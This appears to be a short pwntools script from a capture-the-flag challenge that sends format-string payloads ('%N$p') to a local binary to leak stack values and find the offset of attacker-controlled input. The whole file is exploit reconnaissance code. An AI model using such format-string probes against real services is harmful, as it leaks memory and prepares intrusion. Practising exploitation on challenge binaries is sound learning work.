from pwn import *
elf = context.binary = ELF("./chall")
for i in range(100):
    p = process()
    p.sendline(f"AAAAAAAA|%{i}$p")
    p.recvuntil(b"Welcome to echo service!\n")
    print(f"{i}: " + p.recvline().strip().decode())
    p.close()